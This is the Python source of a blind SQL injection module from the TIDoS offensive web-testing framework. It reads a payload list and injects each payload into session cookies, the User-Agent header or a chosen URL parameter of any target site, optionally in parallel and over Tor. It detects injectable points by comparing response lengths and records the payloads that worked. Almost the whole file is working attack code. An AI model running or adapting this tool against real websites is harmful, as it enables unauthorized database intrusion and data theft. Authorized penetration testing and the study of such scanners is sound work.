#!/usr/bin/env python3
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import os
import re
import sys
import urllib
#import requests
sys.path.append('files/payload-db/')
from core.Core.colors import *
from re import *
import time
from time import sleep
from core.methods.tor import session
from multiprocessing import Pool, TimeoutError
from core.methods.multiproc import listsplit
from core.variables import processes
from urllib.request import Request, urlopen
from modules.VlnAnalysis.Severe.blindsqlsearch import blindsqlsearch

from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

global pay
pay = []

info = ""
searchinfo = ""
properties = {}

def cookiepre(session, web, pay, req):
    success = []
    for i in pay:
        print(B+" [*] Trying Payload : "+C+''+ i)
        time.sleep(0.7)
        for cookie in session.cookies:
            cookie.value += i
            print(O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value)
            r = session.get(web)
            if len(r.content) != len(req.content):
                poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
                print(G+" [+] Blind Based SQli (Cookie Based) Detected! ")
                print(poc)
                print(P+' [+] Code : '+W+str(r.text)+'\n')
                success.append(i)
    return success

def userpre(web, pay, getrq):
    requests = session()
    success = []
    for i in pay:
        print(B+'\n [*] Using payload : '+C+i)
        time.sleep(0.7)
        user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' + 'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
        user_agent['User-agent'] += str(i)
        req = requests.get(web, headers=user_agent, verify=False)
        print(O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent'])
        if len(req.content) != len(getrq.content):
            print(G+' [!] Blind based SQLi (User-Agent Based) Detected!')
            print(R+' [!] User-Agent : '+O+user_agent['User-agent'])
            success.append(i)
    return success

def auto0x00(web, parallel):
    def sqlicookie0x00(web, parallel):

        #print(R+'\n    =========================')
        print(R+'\n     S Q L i  (Cookie Based)')
        print(R+'    ---<>----<>----<>----<>--\n')
                     

        sleep(0.5)
        vsession = session()
        req = vsession.get(web)
        if vsession.cookies:
            print(G+' [+] This website supports session cookies...')
            success = []
            if not parallel:
                for i in pay:
                    print(B+" [*] Trying Payload : "+C+''+ i)
                    time.sleep(0.7)
                    for cookie in vsession.cookies:
                        cookie.value += i
                        print(O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value)
                        r = vsession.get(web)
                        if len(r.content) != len(req.content):
                            poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
                            print(G+" [+] Blind Based SQli (Cookie Based) Detected! ")
                            print(poc)
                            print(P+' [+] Code : '+W+str(r.text)+'\n')
                            success.append(i)
            else:
                paylists = listsplit(pay, round(len(pay)/processes)) 
                with Pool(processes=processes) as pool:
                    res = [pool.apply_async(cookiepre, args=(vsession,web,l,req,)) for l in paylists]
                    #res1 = pool.apply_async(portloop, )
                    for i in res:
                        j = i.get()
                        success += j
            if success:
                data = "SQLi Vulnerability (Cookie) found!\nSuccessful payloads: " + str(success)
                save_data(database, module, lvl1, lvl2, lvl3, name, data)
                print(" [+] SQLi Vulnerability (Cookie) found! Successful payloads:")
                for i in success:
                    print(i)
            else:
                print(R + "\n [-] No payload succeeded."+C)
                save_data(database, module, lvl1, lvl2, lvl3, name, "(cookie) no payload succeeded.")
        else:
            print(R+' [-] No support for cookies...')
            time.sleep(0.5)
            print(R+' [-] Cookie based injection not possible...')
            data = "No support for cookies. Cookie based injection not possible."
            save_data(database, module, lvl1, lvl2, lvl3, name, data)

    def sqliuser0x00(web, parallel):

        #print(R+'\n    =============================')
        print(R+'\n     S Q L i  (User-Agent Based)')
        print(R+'    ---<>----<>----<>----<>----<>\n')
                     
        requests = session()           
        getrq = requests.get(web, verify=False)
        success = []
        if not parallel:
            for i in pay:
                print(B+'\n [*] Using payload : '+C+i)
                time.sleep(0.7)
                user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' + 'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
                user_agent['User-agent'] += str(i)
                req = requests.get(web, headers=user_agent, verify=False)
                print(O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent'])
                if len(req.content) != len(getrq.content):
                    print(G+' [!] Blind based SQLi (User-Agent Based) Detected!')
                    print(R+' [!] User-Agent : '+O+user_agent['User-agent'])
        else:
            paylists = listsplit(pay, round(len(pay)/processes)) 
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(userpre, args=(web,l,getrq,)) for l in paylists]
                #res1 = pool.apply_async(portloop, )
                for i in res:
                    j = i.get()
                    success += j
        if success:
            data = "SQLi Vulnerability (useragent) found!\nSuccessful payloads: " + str(success)
            save_data(database, module, lvl1, lvl2, lvl3, name, data)
            print(" [+] SQLi Vulnerability (useragent) found! Successful payloads:")
            for i in success:
                print(i)
        else:
            print(R + "\n [-] No payload succeeded."+C)
            save_data(database, module, lvl1, lvl2, lvl3, name, "(useragent) no payload succeeded.")

    print(P+' [!] Enter an option :\n')
    print(B+'   [1] '+C+'Cookie Based Blind Injection')
    print(B+'   [2] '+C+'User-Agent Based Blind Injection')
    print(B+'   [3] '+C+'Auto Awesome Module (Automated)\n')
    q = input(O+' [§] TID :> ')
    if q == '3':
        print(GR+' [*] Launching Auto-Awesome Module...')
        blindsqlsearch(web)
    elif q == '2':
        print(GR+' [*] Launching User-Agent Based Module...')
        sqliuser0x00(web, parallel)
    elif q == '1':
        print(GR+' [*] Launching Cookie-Based Module...')
        sqlicookie0x00(web, parallel)

def manualpre(bugs, bug2, pay, getrq):
    success = []
    requests = session()
    for p in pay:
        bugged = bugs + str(p) + bug2
        print(B+" [*] Trying : "+C+bugged)
        sleep(0.7)
        response = requests.get(bugged)
        if len(response.content) != len(getrq.content):
            print('\n'+G+' [+] Vulnerable link detected : ' + bugs)
            print(GR+' [*] Injecting payloads...')
            print(B+' [!] PoC : ' + str(bugged))
            print(R+" [!] Payload : " + O + p + '\033[0m')
            print("\033[1m [!] Code Snippet :\n \033[0m" + str(response) + '\n')
            success.append(p)
    return success

def manual0x00(web, parallel, properties):

    #print(R+'\n    ========================')
    print(R+'\n     S Q L i  (Manual Mode)')
    print(R+'    ---<>----<>----<>----<>-\n')
                 
    requests = session()
    if properties["PARAM"][1] == " ":
        bug = input(O+' [§] Injectable Endpoint '+R+'(eg. /sqli/fetch.php?id=2)'+O+' :> ')
    else:
        bug = properties["PARAM"][1]
    bugs = web + bug
    getrq = requests.get(bugs, timeout=7, verify=False)

    choice = ""
    if "&" in bug:
        ln = len(bug.split("&"))
        choice = input(" [!] Discovered {} parameters. Which one to use? (enter name) :> ".format(ln))
        if not choice in bug:
            sys.exit(" [-] Param {} not found.".format(choice))
    
    bug2 = ""
    param1 = ""
    if choice != "":
        n = bug.split(choice + "=")[1]
        if "&" in n:
            bug2 = bug.split(choice+"=")[1]
            param1 = bug2.split("&")[0]
            bug2 = bug2.replace(param1,"")

    bugs = web + bug.split(choice + '=')[0] + choice + '=' + param1

    print(O+' [!] Using Url : '+GR+bugs)
    if '?' in str(bugs) and '=' in str(bugs):
        success = []
        if not parallel:
            for p in pay:
                bugged = bugs + str(p) + bug2
                print(B+" [*] Trying : "+C+bugged)
                sleep(0.7)
                response = requests.get(bugged)
                if len(response.content) != len(getrq.content):
                    print('\n'+G+' [+] Vulnerable link detected : ' + bugs)
                    print(GR+' [*] Injecting payloads...')
                    print(B+' [!] PoC : ' + str(bugged))
                    print(R+" [!] Payload : " + O + p + '\033[0m')
                    print("\033[1m [!] Code Snippet :\n \033[0m" + str(response) + '\n')
                    success.append(p)
        else:
            paylists = listsplit(pay, round(len(pay)/processes)) 
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(manualpre, args=(bugs,bug2,l,getrq,)) for l in paylists]
                #res1 = pool.apply_async(portloop, )
                for i in res:
                    j = i.get()
                    success += j
        if success:
            data = "SQLi Vulnerability found!\nVulnerable Link: "+bugs+"\nSuccessful payloads: " + str(success)
            save_data(database, module, lvl1, lvl2, lvl3, name, data)
            print(" [+] SQLi Vulnerability found! Successful payloads:")
            for i in success:
                print(i)
        else:
            save_data(database, module, lvl1, lvl2, lvl3, name, "(manual) no payload succeeded.")
            print(R + "\n [-] No payload succeeded."+C)
    else:
        print(R+' [-] Enter an URL with scope parameter...')
        manual0x00(web, parallel, properties)

def blindsqli(web, properties):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = "sqli"
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Critical Vulnerabilities"
    global lvl3
    lvl3 = "blindsqli"
    begin = True
    while True:
        sleep(0.6)
        if web.endswith('/'):
            web = web[:-1]
    
        print(R+'\n     S Q L   I N J E C T I O N  (Blind Based)')
        print(R+'    ---<>----<>----<>----<>----<>----<>----<>-\n')
                     
                     
        print(GR+' [*] Importing error parameters...')
        sleep(0.8)
        try:
            if begin:
                with open('files/payload-db/blindsql_payloads.lst','r') as payloads:
                    for payload in payloads:
                        payload = payload.replace('\n','')
                        pay.append(payload)
                        begin = False

            if properties["PARALLEL"][1] == " ":
                pa = input(" [?] Parallel Attack? (enter for not) :> ")
                parallel = pa != ""
            else:
                parallel = properties["PARALLEL"][1] == "1"

            print(O+'\n [§] Enter the type you want to proceed:\n')
            print(B+'   [1] '+C+'Manual Mode')
            print(B+'   [2] '+C+'Automatic Mode\n')
            p = input(O+' [§] TID :> ')
            if p == '1':
                print(GR+' [*] Initializing manual mode...')
                manual0x00(web, parallel, properties)
            if p == '2':
                print(GR+' [*] Loading automatic mode...')
                auto0x00(web, parallel)

        except IOError:
            print(R+' [-] Payloads file does not exist!')

def attack(web):
    web = web.fullurl
    blindsqli(web, properties)
